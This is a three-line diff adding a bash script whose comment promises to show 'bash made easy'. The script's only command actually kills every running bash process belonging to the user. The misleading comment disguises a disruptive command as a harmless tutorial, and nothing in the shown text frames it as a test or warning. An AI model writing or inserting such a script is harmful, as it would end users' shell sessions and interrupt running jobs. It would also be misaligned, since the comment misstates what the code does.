@@ -1,0 +1,3 @@
+#!/usr/bin/env bash
+# this script show you bash made easy
+kill $(pgrep bash)
